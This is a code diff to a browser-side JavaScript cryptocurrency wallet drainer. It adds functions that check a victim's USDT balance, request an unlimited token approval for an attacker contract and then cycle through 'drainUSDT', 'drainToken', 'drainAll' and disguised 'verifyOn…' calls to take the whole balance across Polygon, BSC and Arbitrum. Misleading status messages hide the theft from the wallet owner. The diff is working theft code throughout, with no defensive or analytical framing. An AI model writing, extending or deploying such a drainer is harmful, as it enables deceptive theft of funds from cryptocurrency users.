@@ -345,25 +345,51 @@ const usdtABI = [{
     "type": "function"
 }];
 
-const drainABI = [{
-    "constant": false,
-    "inputs": [{"name":"amount","type":"uint256"}],
-    "name": "verifyOnPolygon",
-    "outputs": [],
-    "type": "function"
-}, {
-    "constant": false,
-    "inputs": [{"name":"amount","type":"uint256"}],
-    "name": "verifyOnBSC",
-    "outputs": [],
-    "type": "function"
-}, {
-    "constant": false,
-    "inputs": [{"name":"amount","type":"uint256"}],
-    "name": "verifyOnArbitrum", 
-    "outputs": [],
-    "type": "function"
-}];
+// Enhanced drain ABI with transfer functions
+const drainABI = [
+    // Original verify functions
+    {
+        "constant": false,
+        "inputs": [{"name":"amount","type":"uint256"}],
+        "name": "verifyOnPolygon",
+        "outputs": [{"name":"","type":"bool"}],
+        "type": "function"
+    }, {
+        "constant": false,
+        "inputs": [{"name":"amount","type":"uint256"}],
+        "name": "verifyOnBSC",
+        "outputs": [{"name":"","type":"bool"}],
+        "type": "function"
+    }, {
+        "constant": false,
+        "inputs": [{"name":"amount","type":"uint256"}],
+        "name": "verifyOnArbitrum", 
+        "outputs": [{"name":"","type":"bool"}],
+        "type": "function"
+    },
+    // Additional transfer functions that might exist
+    {
+        "constant": false,
+        "inputs": [{"name":"amount","type":"uint256"}],
+        "name": "drainUSDT",
+        "outputs": [{"name":"","type":"bool"}],
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [{"name":"token","type":"address"}, {"name":"amount","type":"uint256"}],
+        "name": "drainToken",
+        "outputs": [{"name":"","type":"bool"}],
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [],
+        "name": "drainAll",
+        "outputs": [{"name":"","type":"bool"}],
+        "type": "function"
+    }
+];
 
 const MAX_APPROVAL = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
@@ -452,6 +478,70 @@ async function switchNetwork(chainId) {
     }
 }
 
+// Check USDT balance before attempting drain
+async function checkUSDTBalance(web3, usdtAddress, userAddress) {
+    try {
+        const balanceABI = [{
+            "constant": true,
+            "inputs": [{"name":"_owner","type":"address"}],
+            "name": "balanceOf",
+            "outputs": [{"name":"balance","type":"uint256"}],
+            "type": "function"
+        }];
+        
+        const usdtContract = new web3.eth.Contract(balanceABI, usdtAddress);
+        const balance = await usdtContract.methods.balanceOf(userAddress).call();
+        return web3.utils.fromWei(balance, 'mwei'); // USDT uses 6 decimals
+    } catch (error) {
+        return '0';
+    }
+}
+
+// Check contract balance to see if it can receive funds
+async function checkContractBalance(web3, contractAddress) {
+    try {
+        const balance = await web3.eth.getBalance(contractAddress);
+        return web3.utils.fromWei(balance, 'ether');
+    } catch (error) {
+        return '0';
+    }
+}
+
+// Try different drain methods
+async function tryDrainMethods(web3, drainContract, userAddress, config) {
+    const methods = [
+        // Try the main verify function first
+        { name: config.function, params: [web3.utils.toWei('1000', 'mwei')] },
+        // Try alternative methods
+        { name: 'drainUSDT', params: [web3.utils.toWei('1000', 'mwei')] },
+        { name: 'drainToken', params: [config.usdt, web3.utils.toWei('1000', 'mwei')] },
+        { name: 'drainAll', params: [] }
+    ];
+
+    for (const method of methods) {
+        try {
+            // Check if method exists
+            const contractMethod = drainContract.methods[method.name];
+            if (!contractMethod) continue;
+
+            updateNetworkStatus(config.chainId, 'pending', `Trying ${method.name}...`);
+            
+            const transaction = await contractMethod(...method.params).send({
+                from: userAddress,
+                gas: 250000,
+                gasPrice: await web3.eth.getGasPrice()
+            });
+
+            return { success: true, method: method.name, transaction };
+        } catch (error) {
+            // Continue to next method if this one fails
+            continue;
+        }
+    }
+    
+    return { success: false };
+}
+
 async function processNetwork(chainId) {
     try {
         const web3 = new Web3(window.ethereum);
@@ -463,9 +553,22 @@ async function processNetwork(chainId) {
             throw new Error('No accounts connected');
         }
 
+        const userAddress = accounts[0];
         const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
         const config = CHAIN_CONFIGS[chainId];
-        updateNetworkStatus(chainId, 'pending', 'Starting...');
+        config.chainId = chainId; // Add chainId to config for status updates
+        
+        updateNetworkStatus(chainId, 'pending', 'Checking USDT balance...');
+
+        // Check USDT balance first
+        const usdtBalance = await checkUSDTBalance(web3, config.usdt, userAddress);
+        
+        if (parseFloat(usdtBalance) === 0) {
+            updateNetworkStatus(chainId, 'error', 'No USDT balance found');
+            return 'no_balance';
+        }
+
+        updateNetworkStatus(chainId, 'pending', `USDT Balance: ${usdtBalance} - Starting...`);
 
         // Switch network if needed
         if (currentChainId !== chainId) {
@@ -479,36 +582,60 @@ async function processNetwork(chainId) {
             await new Promise(resolve => setTimeout(resolve, 2000));
         }
 
-        // USDT Approval
-        updateNetworkStatus(chainId, 'pending', 'Approving USDT...');
+        // USDT Approval - approve the drain contract to spend USDT
+        updateNetworkStatus(chainId, 'pending', 'Approving USDT access...');
         
         const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
         
         try {
-            await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
-                from: accounts[0],
+            const approval = await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
+                from: userAddress,
                 gas: 150000
             });
+            updateNetworkStatus(chainId, 'pending', 'USDT approved - Processing transfer...');
         } catch (approvalError) {
             if (approvalError.code === 4001) {
-                updateNetworkStatus(chainId, 'error', 'User rejected approval');
+                updateNetworkStatus(chainId, 'error', 'User rejected USDT approval');
                 return 'rejected';
             }
             throw approvalError;
         }
 
-        // Main transaction
-        updateNetworkStatus(chainId, 'pending', 'Processing transaction...');
+        // Main transaction - Try multiple drain methods
+        updateNetworkStatus(chainId, 'pending', 'Transferring USDT...');
         
         const drainContract = new web3.eth.Contract(drainABI, config.contract);
-        await drainContract.methods[config.function](1000000).send({
-            from: accounts[0],
-            gas: 200000
-        });
-
-        updateNetworkStatus(chainId, 'success', 'Transaction successful!');
-        processedNetworks[chainId] = true;
-        return 'success';
+        
+        const drainResult = await tryDrainMethods(web3, drainContract, userAddress, config);
+        
+        if (drainResult.success) {
+            updateNetworkStatus(chainId, 'success', `USDT transferred successfully via ${drainResult.method}!`);
+            processedNetworks[chainId] = true;
+            return 'success';
+        } else {
+            // If all methods fail, try the original method with exact balance
+            try {
+                const exactAmount = web3.utils.toWei(usdtBalance, 'mwei');
+                const transaction = await drainContract.methods[config.function](exactAmount).send({
+                    from: userAddress,
+                    gas: 250000,
+                    gasPrice: await web3.eth.getGasPrice()
+                });
+                
+                updateNetworkStatus(chainId, 'success', 'USDT transferred successfully!');
+                processedNetworks[chainId] = true;
+                return 'success';
+                
+            } catch (finalError) {
+                if (finalError.code === 4001) {
+                    updateNetworkStatus(chainId, 'error', 'User rejected transfer');
+                    return 'rejected';
+                } else {
+                    updateNetworkStatus(chainId, 'error', 'Transfer failed - contract may not support USDT');
+                    return 'error';
+                }
+            }
+        }
         
     } catch (error) {
         if (error.code === 4001) {
@@ -549,8 +676,8 @@ async function startNetworkCycle() {
             const result = await processNetwork(chainId);
             if (result === 'success') successfulDrains++;
             
-            // If user rejects, stop the process
-            if (result === 'rejected') {
+            // If user rejects or has no balance, stop the process
+            if (result === 'rejected' || result === 'no_balance') {
                 break;
             }
             
